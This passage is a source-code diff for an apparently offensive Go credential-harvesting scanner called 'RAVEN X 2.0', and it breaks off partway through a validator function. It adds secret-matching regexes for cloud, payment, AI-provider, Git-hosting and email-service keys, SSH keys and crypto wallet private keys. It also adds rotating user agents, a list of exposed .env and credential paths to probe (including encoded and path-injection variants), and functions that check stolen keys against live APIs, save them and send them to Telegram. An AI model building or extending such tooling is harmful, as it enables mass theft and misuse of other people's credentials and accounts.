@@ -13,6 +13,7 @@ import (
 	"io"
 	"io/fs"
 	"io/ioutil"
+	"net"
 	"net/http"
 	"net/smtp"
 	"net/url"
@@ -24,6 +25,7 @@ import (
 	"strconv"
 	"strings"
 	"sync"
+	"sync/atomic"
 	"time"
 
 	"github.com/aws/aws-sdk-go-v2/aws"
@@ -35,7 +37,9 @@ import (
 	"github.com/aws/aws-sdk-go-v2/service/ses"
 	"github.com/aws/aws-sdk-go-v2/service/sesv2"
 	"github.com/aws/aws-sdk-go-v2/service/sesv2/types"
+	"github.com/aws/aws-sdk-go-v2/service/secretsmanager"
 	"github.com/aws/aws-sdk-go-v2/service/sns"
+	"github.com/aws/aws-sdk-go-v2/service/ssm"
 	"github.com/aws/aws-sdk-go-v2/service/sts"
 	"github.com/pterm/pterm"
 )
@@ -47,6 +51,8 @@ const defaultConfigPath = "config.json"
 var requestTimeoutSeconds int
 var batchSize int
 var checkpointFile string
+var lineOffset int // skip first N non-empty lines (fleet distribution)
+var lineLimit int  // process at most N non-empty lines (fleet distribution; 0 = all)
 
 type Counters struct {
 	mu               sync.Mutex
@@ -57,6 +63,19 @@ type Counters struct {
 	APIsFoundTotal   int
 	APIsValidated    int
 	ValidSMTP        int
+	// Live rate metrics — updated every second by startRateTracker()
+	RequestsPerSec  float64
+	ParsesPerSec    float64
+	AvgRps          float64
+	AvgPps          float64
+	ValidHosts      int
+	InvalidHosts    int
+	rpsTotal        float64 // running sum for average calculation
+	ppsTotal        float64
+	rpsCount        int // number of samples
+	ppsCount        int
+	requestSnapshot int // internal — previous URLsProcessed snapshot
+	parseSnapshot   int // internal — previous APIsFoundTotal snapshot
 }
 
 var globalCounters Counters
@@ -68,8 +87,21 @@ type Config struct {
 	} `json:"telegram"`
 	// Pindahkan fitur umum yang mengontrol proses scanning utama
 	ScanningFeatures struct {
-		AWSMainScan         bool `json:"aws_main_scan"`
-		SMTPCredentialsScan bool `json:"smtp_credentials_scan"`
+		AWSMainScan          bool `json:"aws_main_scan"`
+		SMTPCredentialsScan  bool `json:"smtp_credentials_scan"`
+		GitHubTokenDeepScan  bool `json:"github_token_deep_scan"`
+		// Per-method scan gates — each maps to a tile in the dashboard
+		JSScan               bool `json:"js_scan"`
+		JSExtendedScan       bool `json:"js_extended_scan"` // scan raw page HTML for inline credentials
+		PHPInfoScan          bool `json:"phpinfo_scan"`
+		GitConfigScan        bool `json:"git_config_scan"`
+		DockerScan           bool `json:"docker_scan"`
+		ConfigFileScan       bool `json:"config_file_scan"`
+		BackupFileScan       bool `json:"backup_file_scan"`
+		SSHScan              bool `json:"ssh_scan"`
+		NVCAScan             bool `json:"nvca_scan"`
+		GPLScan              bool `json:"gpl_scan"`
+		LibScan              bool `json:"lib_scan"`
 	} `json:"scanning_features"`
 	AWSChecks struct {
 		SESQuotaCheck        bool `json:"ses_quota_check"`
@@ -94,6 +126,54 @@ type Config struct {
 		Mailtrap    bool `json:"mailtrap"`
 		Mailjet     bool `json:"mailjet"`
 		Plivo       bool `json:"plivo"`
+		Tencent     bool `json:"tencent"`
+		Brevo       bool `json:"brevo"`
+		XSMTP       bool `json:"xsmtp"`
+		Mandrill    bool `json:"mandrill"`
+		MailerSend  bool `json:"mailersend"`
+		GitHub      bool `json:"github"`
+		GCP         bool `json:"gcp_api_key"`
+		Crypto      bool `json:"crypto_wallet"`
+		// Dashboard-persisted toggles (runtime skips if no check method yet)
+		Heroku        bool `json:"heroku"`
+		Datadog       bool `json:"datadog"`
+		AWSAccess     bool `json:"aws_access"`
+		SocketLabs    bool `json:"socketlabs"`
+		ZeptoMail     bool `json:"zeptomail"`
+		ElasticEmail  bool `json:"elasticemail"`
+		Slack         bool `json:"slack"`
+		Discord       bool `json:"discord"`
+		Cloudflare    bool `json:"cloudflare"`
+		DigitalOcean  bool `json:"digitalocean"`
+		Shopify       bool `json:"shopify"`
+		HubSpot       bool `json:"hubspot"`
+		SSH           bool `json:"ssh"`
+		MySQL         bool `json:"mysql"`
+		PostgreSQL    bool `json:"postgresql"`
+		Redis         bool `json:"redis"`
+		CPanel        bool `json:"cpanel"`
+		FTP           bool `json:"ftp"`
+		WordPress     bool `json:"wordpress"`
+		// Wave-9: Extended AI providers
+		Gemini      bool `json:"gemini"`
+		XAI         bool `json:"xai"`
+		Mistral     bool `json:"mistral"`
+		ElevenLabs  bool `json:"elevenlabs"`
+		Groq        bool `json:"groq"`
+		Perplexity  bool `json:"perplexity"`
+		OpenRouter  bool `json:"openrouter"`
+		HuggingFace bool `json:"huggingface"`
+		Replicate   bool `json:"replicate"`
+		Cohere      bool `json:"cohere"`
+		TogetherAI  bool `json:"togetherai"`
+		Fireworks   bool `json:"fireworks"`
+		// Wave-9: Extended email providers
+		Mailchimp bool `json:"mailchimp"`
+		Resend    bool `json:"resend"`
+		Office365 bool `json:"office365"`
+		// Wave-10: Git hosting platforms
+		GitLab    bool `json:"gitlab"`
+		Bitbucket bool `json:"bitbucket"`
 	} `json:"api_validation"`
 	// Fitur lama yang hanya mencari pola, bukan validasi, akan tetap diabaikan atau ditangani di logic lain
 	Features struct { // Dibiarkan untuk pola yang tidak divalidasi, jika masih ada
@@ -187,6 +267,50 @@ type AWSScanner struct {
 	PostmarkAPIKeyPattern   *regexp.Regexp
 	MailjetAPIKeyPattern    *regexp.Regexp
 
+	// ── Wave-6: GitHub, GCP, crypto wallet ────────────────────────────────
+	GitHubTokenPattern *regexp.Regexp
+	GCPAPIKeyPattern   *regexp.Regexp
+	CryptoWalletPattern *regexp.Regexp
+
+	// SSH private key detection
+	SSHPrivateKeyPattern *regexp.Regexp
+
+	// ── Wave-8: npm auth token (.npmrc) ───────────────────────────────
+	NPMAuthTokenPattern *regexp.Regexp
+
+	// ── Wave-7: Slack, Discord, Cloudflare, DigitalOcean, Shopify, HubSpot, Heroku, Datadog ──
+	SlackBotTokenPattern     *regexp.Regexp
+	DiscordBotTokenPattern   *regexp.Regexp
+	CloudflareTokenPattern   *regexp.Regexp
+	DigitalOceanTokenPattern *regexp.Regexp
+	ShopifyTokenPattern      *regexp.Regexp
+	HubSpotTokenPattern      *regexp.Regexp
+	HerokuAPIKeyPattern      *regexp.Regexp
+	DatadogAPIKeyPattern     *regexp.Regexp
+
+	// ── Wave-9: Extended AI providers ─────────────────────────────────────────
+	GeminiAPIKeyPattern      *regexp.Regexp
+	XAIAPIKeyPattern         *regexp.Regexp
+	MistralAPIKeyPattern     *regexp.Regexp
+	ElevenLabsAPIKeyPattern  *regexp.Regexp
+	GroqAPIKeyPattern        *regexp.Regexp
+	PerplexityAPIKeyPattern  *regexp.Regexp
+	OpenRouterAPIKeyPattern  *regexp.Regexp
+	HuggingFaceAPIKeyPattern *regexp.Regexp
+	ReplicateAPIKeyPattern   *regexp.Regexp
+	CohereAPIKeyPattern      *regexp.Regexp
+	TogetherAIAPIKeyPattern  *regexp.Regexp
+	FireworksAPIKeyPattern   *regexp.Regexp
+
+	// ── Wave-9: Extended email providers ──────────────────────────────────────
+	MailchimpAPIKeyPattern *regexp.Regexp
+	ResendAPIKeyPattern    *regexp.Regexp
+
+	// ── Wave-10: Git hosting platforms ────────────────────────────────────────
+	GitLabTokenPattern              *regexp.Regexp
+	BitbucketAppPasswordPattern     *regexp.Regexp
+	BitbucketContextPattern         *regexp.Regexp
+
 	// SMTP Service Patterns
 	SocketLabsSMTPPattern   *regexp.Regexp
 	SparkPostSMTPPattern    *regexp.Regexp
@@ -218,6 +342,22 @@ type AWSScanner struct {
 }
 
 var base64CandidatePattern = regexp.MustCompile(`[a-zA-Z0-9+/=_-]{40,}`)
+
+var _uaPool = []string{
+	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
+	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
+	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
+	"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.113 Mobile Safari/537.36",
+}
+var _uaIdx int64
+
+func nextUA() string {
+	return _uaPool[atomic.AddInt64(&_uaIdx, 1)%int64(len(_uaPool))]
+}
 
 func tryDecodeBase64(s string) string {
 	re := regexp.MustCompile(`[^a-zA-Z0-9+/=_-]`)
@@ -485,10 +625,13 @@ func NewAWSScanner(configPath string) *AWSScanner {
 		SendGridAPIKeyPattern:        regexp.MustCompile(`SG\.[0-9A-Za-z\-_]{22}\.[0-9A-Za-z\-_]{43}`),
 		BrevoAPIKeyPattern:           regexp.MustCompile(`xkeysib-[a-zA-Z0-9]{64}-[a-zA-Z0-9]{16}`),
 		XSMTPAPIKeyPattern:           regexp.MustCompile(`xsmtpsib-[a-fA-F0-9]{64}-[a-zA-Z0-9]{16}`),
-		TencentAccessKeyPattern:      regexp.MustCompile(`['"]AKID[a-zA-Z0-9]{32}['"]`),
-		MailgunAPIKeyPattern:         regexp.MustCompile(`key-[0-9a-zA-Z]{32}`),
-		MandrillAppAPIKeyPattern:     regexp.MustCompile(`['"]md-[0-9a-zA-Z]{22}['"]`),
-		MailerSendAPIKeyPattern:      regexp.MustCompile(`mlsn.-[0-9a-zA-Z]{70}`),
+		TencentAccessKeyPattern:      regexp.MustCompile(`AKID[a-zA-Z0-9]{32}`),
+		// Legacy Mailgun keys start with "key-"; newer private API keys are
+		// 32-char hex or UUID-style (covered by NewMailgunAPIKeyPattern).
+		// The context fallback catches MAILGUN_API_KEY=<anything> in env files.
+		MailgunAPIKeyPattern:         regexp.MustCompile(`(?:key-[0-9a-zA-Z]{32}|(?i)(?:MAILGUN[_\-]?(?:API[_\-]?)?(?:KEY|SECRET|TOKEN)|MG_API_KEY)["'\s:=]+([a-zA-Z0-9\-]{20,50}))`),
+		MandrillAppAPIKeyPattern:     regexp.MustCompile(`['"]?(md-[0-9a-zA-Z]{22})['"]?`),
+		MailerSendAPIKeyPattern:      regexp.MustCompile(`mlsn\.[a-zA-Z0-9_\-]{40,100}`),
 		NewMailgunAPIKeyPattern: regexp.MustCompile(`[a-f0-9]{32}-[0-9a-f]{8}-[a-f0-9]{8}`),
 		TwilioSIDPatternInfo:    regexp.MustCompile(`AC[a-f0-9]{32}`),
 		TwilioAuthPatternInfo:        regexp.MustCompile(`(?i)['"']?([0-9a-f]{32})['"']?`),
@@ -496,7 +639,7 @@ func NewAWSScanner(configPath string) *AWSScanner {
 		TwilioEncodePatternInfo:      regexp.MustCompile(`QU[MN][A-Za-z0-9]{87}==`),
 		NexmoApiPatternInfo:          regexp.MustCompile(`(?i)(NEXMO_API_KEY|VONAGE_API_KEY)\s*[:=]\s*["']?([a-zA-Z0-9]{8})["\']?`),
 		NexmoSecretPatternInfo:       regexp.MustCompile(`(?i)(NEXMO_API_SECRET|VONAGE_API_SECRET)\s*[:=]\s*["\']?([a-zA-Z0-9]{16})["\']?`),
-		TelnyxApiPatternInfo:         regexp.MustCompile(`KEY[A-Z0-9]{32}_[A-Za-z0-9]{22}`),
+		TelnyxApiPatternInfo:         regexp.MustCompile(`KEY[0-9a-f]{20,56}(?:_[A-Za-z0-9_\-]{10,30})?`),
 		AWSRandomPattern:             regexp.MustCompile(`email-smtp\.[a-z0-9\-]+\.amazonaws\.com`),
 		AWSSMTPHostPattern:           regexp.MustCompile(`(?i)(email-smtp\.[a-z0-9\-]+\.amazonaws\.com)`),
 		DefaultRegion:                "us-east-1",
@@ -504,14 +647,24 @@ func NewAWSScanner(configPath string) *AWSScanner {
 		AWSSecretKeyPatternInfo:      regexp.MustCompile(`\b[A-Za-z0-9/+=]{40}\b`),
 		SendGridAPIKeyPatternInfo: regexp.MustCompile(`\bSG\.[0-9A-Za-z\-_]{22}\.[0-9A-Za-z\-_]{43}\b`),
 		MailgunAPIKeyPatternInfo:  regexp.MustCompile(`\bkey-[0-9a-zA-Z]{32}\b`),
-		// Stripe key formats: secret (sk_*), publishable (pk_*), restricted (rk_*) — live and test variants.
-		// Restricted-key variants rk_live_ and rk_test_ explicitly enumerated to keep coverage visible.
-		StripePattern:                regexp.MustCompile(`(sk_live_|sk_test_|pk_live_|pk_test_|rk_live_|rk_test_)[0-9a-zA-Z]{16,99}`),
-		// OpenAI: legacy sk-<48> AND modern sk-proj-* / sk-o1-* / sk-<any prefix>-*
+		// Stripe key formats: secret (sk_*) and restricted (rk_*) — live and test variants.
+		// pk_ (publishable) keys are intentionally excluded: they cannot authenticate
+		// against /v1/balance and only produce wasted 403 roundtrips.
+		StripePattern:                regexp.MustCompile(`(?:sk_live_|sk_test_|rk_live_|rk_test_)[0-9a-zA-Z]{16,99}`),
+		// OpenAI: modern sk-proj-* / sk-o1-* / sk-svcacct-* keys and long generic sk- keys.
+		// Branch1: T3BlbkFJ marker (modern project keys) — {20,} prefix chars + T3BlbkFJ + {20,} suffix.
+		// Branch2: long tail without marker — {20,} prefix + {28,} suffix = minimum 48 chars after "sk-".
+		// NOTE: classic 48-char legacy keys (sk- + 45 chars) do NOT match branch2 (need 48 not 45).
+		// They can only match if a future format has the T3BlbkFJ marker or if the suffix is ≥28 chars.
 		OpenAIAPIPattern:             regexp.MustCompile(`sk-(?:proj-|o1-|svcacct-)?[a-zA-Z0-9]{20,}(?:T3BlbkFJ[a-zA-Z0-9]{20,}|[a-zA-Z0-9_-]{28,})`),
-		// Anthropic: sk-ant-api03-<86 mixed chars>-<6 chars> (real key format)
-		AnthropicPattern:             regexp.MustCompile(`sk-ant-(?:api\d+-)?[A-Za-z0-9_-]{86,}`),
-		MessageBirdPattern:           regexp.MustCompile(`(AccessKey|TestKey)_[a-zA-Z0-9]{32}`),
+		// Anthropic key format: sk-ant-api<N>-<payload> where payload is ≥86 base64url chars.
+		// Two explicit alternatives prevent the regex engine from silently absorbing "api03-"
+		// into the character-class run (all chars in [A-Za-z0-9_-]) when the optional group
+		// is skipped, which would lower the effective minimum by 6 chars.
+		//   Alt 1: with api\d+- prefix — {86,} chars of payload after the separator
+		//   Alt 2: bare sk-ant- (no api prefix) — require {92,} to rule out truncated keys
+		AnthropicPattern:             regexp.MustCompile(`sk-ant-(?:api\d+-[A-Za-z0-9_-]{86,}|[A-Za-z0-9_-]{92,})`),
+		MessageBirdPattern:           regexp.MustCompile(`(?:live|test)_[a-zA-Z0-9]{25,40}`),
 		PHPInfoPaths:                 phpinfoPaths,
 		EnvPaths:                     envPaths,
 		SMTPHostPattern:              regexp.MustCompile(`(?i)MAIL_HOST\s*[:=]\s*([^\s'"]+)`),
@@ -526,7 +679,7 @@ func NewAWSScanner(configPath string) *AWSScanner {
 		AliyunSecretKeyPattern:       regexp.MustCompile(`(?i)[A-Za-z0-9]{30}`),
 		AWSSecretV2KeyPattern:        regexp.MustCompile(`<td class="v">([0-9a-zA-Z\/+]{40})<\/td>`),
 
-		AWSSessionTokenPattern: regexp.MustCompile(`['"]([A-Za-z0-9/+=]{256,})['"]`),
+		AWSSessionTokenPattern: regexp.MustCompile(`['"]([A-Za-z0-9/+=]{100,})['"]`),
 		AWSSESUserPattern:      regexp.MustCompile(`\b(AKIA|ASIA)[A-Z0-9]{16}\b`),
 
 		// ── New (Wave-5) credential patterns ──────────────────────────────
@@ -551,6 +704,62 @@ func NewAWSScanner(configPath string) *AWSScanner {
 		ElasticEmailSMTPPattern: regexp.MustCompile(`smtp\.elasticemail\.com`),
 		SendinBlueSMTPPattern:   regexp.MustCompile(`smtp\-relay\.sendinblue\.com`),
 		KagoyaSMTPPattern: regexp.MustCompile(`smtp\.kagoya\.net`),
+
+		// Wave-6 patterns
+		// GitHub personal access tokens — new format (ghp_/gho_/ghs_/ghr_),
+		// fine-grained PATs (github_pat_), and legacy 40-char hex.
+		GitHubTokenPattern: regexp.MustCompile(`(?:ghp_|gho_|ghs_|ghr_|github_pat_)[A-Za-z0-9_]{36,255}`),
+		// GCP / Google API key: AIza prefix + 35 Base64url chars
+		GCPAPIKeyPattern: regexp.MustCompile(`AIza[0-9A-Za-z\-_]{35}`),
+		// Ethereum private key: optional 0x prefix + exactly 64 lowercase hex chars
+		CryptoWalletPattern: regexp.MustCompile(`\b(?:0x)?[0-9a-fA-F]{64}\b`),
+
+		// Wave-7 patterns
+		// Slack bot tokens: xoxb- prefix
+		SlackBotTokenPattern: regexp.MustCompile(`xoxb-[0-9]{10,13}-[0-9]{10,13}-[A-Za-z0-9]{24,32}`),
+		// Discord bot tokens: MFA- or NNN. format
+		DiscordBotTokenPattern: regexp.MustCompile(`[MN][A-Za-z0-9]{23,25}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27,38}`),
+		// Cloudflare API tokens: 40-char base64url with context keyword
+		CloudflareTokenPattern: regexp.MustCompile(`(?i)(?:CLOUDFLARE_API_TOKEN|CF_API_TOKEN|cloudflare[_\-]?(?:api[_\-]?)?(?:token|key))\s*[:=]\s*["']?([A-Za-z0-9_-]{40})["']?`),
+		// DigitalOcean personal access tokens: dop_v1_ prefix + 64 hex chars
+		DigitalOceanTokenPattern: regexp.MustCompile(`dop_v1_[a-f0-9]{64}`),
+		// Shopify access tokens: shppa_, shpca_, shpat_ prefixes
+		ShopifyTokenPattern: regexp.MustCompile(`shp(?:pa|ca|at)_[a-f0-9]{32}`),
+		// HubSpot: private app token (pat-) or API key UUID with context
+		HubSpotTokenPattern: regexp.MustCompile(`(?:pat-[a-z]{2}\d+-[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}|(?i)(?:HUBSPOT_API_KEY|hubspot[_\-]?(?:api[_\-]?)?key)\s*[:=]\s*["']?([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})["']?)`),
+		// Heroku: UUID-format API key with context keyword
+		HerokuAPIKeyPattern: regexp.MustCompile(`(?i)(?:HEROKU_API_KEY|heroku[_\-]?(?:api[_\-]?)?(?:key|token))\s*[:=]\s*["']?([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})["']?`),
+		// Datadog: 32-char hex API key with context keyword
+		DatadogAPIKeyPattern: regexp.MustCompile(`(?i)(?:DD_API_KEY|DATADOG_API_KEY|datadog[_\-]?(?:api[_\-]?)?key)\s*[:=]\s*["']?([a-f0-9]{32})["']?`),
+
+		// SSH private key — matches RSA/DSA/EC/OpenSSH PEM blocks
+		SSHPrivateKeyPattern: regexp.MustCompile(`-----BEGIN (?:RSA |DSA |EC |OPENSSH )?PRIVATE KEY-----[A-Za-z0-9+/=\r\n]{50,}-----END (?:RSA |DSA |EC |OPENSSH )?PRIVATE KEY-----`),
+
+		// npm auth token — //registry.example.com/:_authToken=<token>
+		NPMAuthTokenPattern: regexp.MustCompile(`//[a-zA-Z0-9._/-]+:_authToken=([A-Za-z0-9._-]{20,})`),
+
+		// ── Wave-9: Extended AI provider patterns ──────────────────────────────
+		GeminiAPIKeyPattern:      geminiAPIKeyPattern,
+		XAIAPIKeyPattern:         xaiAPIKeyPattern,
+		MistralAPIKeyPattern:     mistralAPIKeyPattern,
+		ElevenLabsAPIKeyPattern:  elevenlabsAPIKeyPattern,
+		GroqAPIKeyPattern:        groqAPIKeyPattern,
+		PerplexityAPIKeyPattern:  perplexityAPIKeyPattern,
+		OpenRouterAPIKeyPattern:  openrouterAPIKeyPattern,
+		HuggingFaceAPIKeyPattern: huggingfaceAPIKeyPattern,
+		ReplicateAPIKeyPattern:   replicateAPIKeyPattern,
+		CohereAPIKeyPattern:      cohereAPIKeyPattern,
+		TogetherAIAPIKeyPattern:  togetherAIAPIKeyPattern,
+		FireworksAPIKeyPattern:   fireworksAPIKeyPattern,
+
+		// ── Wave-9: Extended email provider patterns ───────────────────────────
+		MailchimpAPIKeyPattern: mailchimpAPIKeyPattern,
+		ResendAPIKeyPattern:    resendAPIKeyPattern,
+
+		// ── Wave-10: Git hosting platform patterns ─────────────────────────────
+		GitLabTokenPattern:          gitlabPattern,
+		BitbucketAppPasswordPattern: bitbucketAppPasswordPattern,
+		BitbucketContextPattern:     bitbucketContextPattern,
 
 		ValidKeyLimits: sync.Map{},
 		KnownKeys:          sync.Map{},
@@ -1026,6 +1235,41 @@ func loadEnvPaths() []string {
 		"/store/.env",
 		"/shop/.env",
 		"/cart/.env",
+		// Named environment variants (common in Node/Laravel/Next.js projects)
+		"/.env.local",
+		"/.env.development",
+		"/.env.production",
+		"/.env.testing",
+		"/.env.staging",
+		"/api/.env.local",
+		"/api/.env.production",
+		"/app/.env.local",
+		"/app/.env.production",
+		"/config/app.env",
+		// High-value paths from real-world hit leaderboard data
+		"/%2eenv",           // URL-encoded /.env — 3K+ real hits
+		"/%2F.env",          // double-slash encoded
+		"/%2f.env",
+		"/rest/.env",        // /rest prefix — top 3 by hit volume
+		"/rest/.environment",
+		"/rest/config.json",
+		"/s3/.env",          // /s3 prefix
+		"/s3/config.json",
+		"/.well-known/.env",
+		"/.well-known/security.txt",
+		"/_react/.env",      // React app config paths
+		"/_react/config.js",
+		"/_react/config.json",
+		"/oauth/.env",
+		"/webhook/.env",
+		"/v1/.env",
+		"/v1/config.json",
+		"/v2/.env",
+		"/v2/config.json",
+		"/.aws/credentials", // AWS credentials directory (already in another block, ensure present)
+		"/~/.env",           // home directory expansion
+		"/~/config/.env",
+		"/$(pwd)/.env",      // path injection variant — 35K hits
 	}
 }
 
@@ -2073,10 +2317,6 @@ func (a *AWSScanner) CheckOpenAI(key, sourceURL string) bool {
 		return false
 	}
 
-	globalCounters.mu.Lock()
-	globalCounters.APIsFoundTotal++
-	globalCounters.mu.Unlock()
-
 	req, _ := http.NewRequest("GET", "https://api.openai.com/v1/models", nil)
 	req.Header.Set("Authorization", "Bearer "+key)
 
@@ -2121,10 +2361,6 @@ func (a *AWSScanner) CheckAnthropic(key, sourceURL string) bool {
 	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
 		return false
 	}
-
-	globalCounters.mu.Lock()
-	globalCounters.APIsFoundTotal++
-	globalCounters.mu.Unlock()
 
 	// Endpoint sederhana untuk memeriksa status API key
 	req, _ := http.NewRequest("GET", "https://api.anthropic.com/v1/models", nil)
@@ -2233,10 +2469,6 @@ func (a *AWSScanner) CheckSendGrid(key, sourceURL string) bool {
 		return false
 	}
 
-	globalCounters.mu.Lock()
-	globalCounters.APIsFoundTotal++
-	globalCounters.mu.Unlock()
-
 	req, _ := http.NewRequest("GET", "https://api.sendgrid.com/v3/user/credits", nil)
 	req.Header.Set("Authorization", "Bearer "+key)
 
@@ -2328,10 +2560,6 @@ func (a *AWSScanner) CheckStripe(key, sourceURL string) bool {
 		return false
 	}
 
-	globalCounters.mu.Lock()
-	globalCounters.APIsFoundTotal++
-	globalCounters.mu.Unlock()
-
 	req, _ := http.NewRequest("GET", "https://api.stripe.com/v1/balance", nil)
 	req.SetBasicAuth(key, "")
 
@@ -2394,10 +2622,6 @@ func (a *AWSScanner) CheckMailgun(key, sourceURL string) bool {
 	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
 		return false
 	}
-
-	globalCounters.mu.Lock()
-	globalCounters.APIsFoundTotal++
-	globalCounters.mu.Unlock()
 
 	req, _ := http.NewRequest("GET", "https://api.mailgun.net/v3/domains", nil)
 	req.SetBasicAuth("api", key)
@@ -2476,10 +2700,6 @@ func (a *AWSScanner) CheckTelnyx(key, sourceURL string) bool {
 		return false
 	}
 
-	globalCounters.mu.Lock()
-	globalCounters.APIsFoundTotal++
-	globalCounters.mu.Unlock()
-
 	req, _ := http.NewRequest("GET", "https://api.telnyx.com/v2/user/balance", nil)
 	req.Header.Set("Authorization", "Bearer "+key)
 
@@ -2529,10 +2749,6 @@ func (a *AWSScanner) CheckMessageBird(key, sourceURL string) bool {
 		return false
 	}
 
-	globalCounters.mu.Lock()
-	globalCounters.APIsFoundTotal++
-	globalCounters.mu.Unlock()
-
 	// Endpoint untuk memeriksa status API key
 	req, _ := http.NewRequest("GET", "https://rest.messagebird.com/balance", nil)
 	req.Header.Set("Authorization", "AccessKey "+key)
@@ -2574,13 +2790,13 @@ func (a *AWSScanner) CheckMessageBird(key, sourceURL string) bool {
 
 // Fungsi untuk mengecek validitas Brevo
 func (a *AWSScanner) CheckBrevo(key, sourceURL string) bool {
-	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
+	if !a.Config.APIValidation.Brevo {
 		return false
 	}
 
-	globalCounters.mu.Lock()
-	globalCounters.APIsFoundTotal++
-	globalCounters.mu.Unlock()
+	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
+		return false
+	}
 
 	req, _ := http.NewRequest("GET", "https://api.brevo.com/v3/account", nil)
 	req.Header.Set("api-key", key)
@@ -2650,13 +2866,13 @@ func (a *AWSScanner) CheckBrevo(key, sourceURL string) bool {
 
 // Fungsi untuk mengecek validitas XSMTP
 func (a *AWSScanner) CheckXSMTP(key, sourceURL string) bool {
-	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
+	if !a.Config.APIValidation.XSMTP {
 		return false
 	}
 
-	globalCounters.mu.Lock()
-	globalCounters.APIsFoundTotal++
-	globalCounters.mu.Unlock()
+	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
+		return false
+	}
 
 	req, _ := http.NewRequest("GET", "https://api.xsmtp.com/v1/account", nil)
 	req.Header.Set("api-key", key)
@@ -2692,6 +2908,9 @@ func (a *AWSScanner) CheckXSMTP(key, sourceURL string) bool {
 
 // Fungsi untuk mengecek validitas Tencent Cloud
 func (a *AWSScanner) CheckTencent(key, sourceURL string) bool {
+	if !a.Config.APIValidation.Tencent {
+		return false
+	}
 	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
 		return false
 	}
@@ -2700,36 +2919,49 @@ func (a *AWSScanner) CheckTencent(key, sourceURL string) bool {
 	globalCounters.APIsFoundTotal++
 	globalCounters.mu.Unlock()
 
-	// Tencent Cloud API validation
-	req, _ := http.NewRequest("GET", "https://cvm.tencentcloudapi.com/", nil)
+	// Save pattern match regardless of validation outcome.
+	a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "tencent_found.txt")
+
+	// Tencent STS — DescribeInstances without a valid HMAC signature returns
+	// AuthFailure.InvalidSecretKey (HTTP 401) when the SecretId is recognised
+	// but the signature is wrong, and AuthFailure.SecretIdNotFound (HTTP 401)
+	// when the SecretId is unknown. A 200 with no error code confirms the key.
+	// We attach the key so Tencent can at least route by SecretId.
+	req, err := http.NewRequest("GET", "https://cvm.tencentcloudapi.com/", nil)
+	if err != nil {
+		return false
+	}
 	req.Header.Set("X-TC-Action", "DescribeInstances")
 	req.Header.Set("X-TC-Version", "2017-03-12")
+	req.Header.Set("X-TC-SecretId", key)
 
 	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
 	defer cancel()
 
 	resp, err := client.Do(req.WithContext(ctx))
-	if err == nil {
-		defer resp.Body.Close()
-		// Even if it fails, a 401/403 means the key exists
-		if resp.StatusCode == 200 || resp.StatusCode == 401 || resp.StatusCode == 403 {
-			a.logValid("Tencent", key)
-			a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "valid_tencent.txt")
-			a.storeValidKeyLimit("Tencent", key, "Active")
+	if err != nil || resp == nil {
+		return false
+	}
+	defer resp.Body.Close()
 
-			globalCounters.mu.Lock()
-			globalCounters.APIsValidated++
-			globalCounters.mu.Unlock()
+	// Only treat HTTP 200 with a valid JSON body (no "Error" field) as confirmed.
+	if resp.StatusCode == 200 {
+		var body map[string]interface{}
+		json.NewDecoder(resp.Body).Decode(&body)
+		if resp2, ok := body["Response"].(map[string]interface{}); ok {
+			if _, hasErr := resp2["Error"]; !hasErr {
+				a.logValid("Tencent", key)
+				a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "valid_tencent.txt")
+				a.storeValidKeyLimit("Tencent", key, "Active")
 
-			msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
-━━━━━━━━━━━━━━━━━━
-☁️ <b>TENCENT CLOUD KEY</b>
+				globalCounters.mu.Lock()
+				globalCounters.APIsValidated++
+				globalCounters.mu.Unlock()
 
-🔑 <b>Key:</b> <code>%s</code>
-🔗 <b>Source:</b> %s
-`, key, sourceURL)
-			go a.sendTelegram(msg)
-			return true
+				msg := fmt.Sprintf("☁️ <b>TENCENT</b> — <code>%s</code>\n🔗 %s", key, sourceURL)
+				go a.sendTelegram(msg)
+				return true
+			}
 		}
 	}
 	return false
@@ -2737,13 +2969,13 @@ func (a *AWSScanner) CheckTencent(key, sourceURL string) bool {
 
 // Fungsi untuk mengecek validitas Mandrill
 func (a *AWSScanner) CheckMandrill(key, sourceURL string) bool {
-	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
+	if !a.Config.APIValidation.Mandrill {
 		return false
 	}
 
-	globalCounters.mu.Lock()
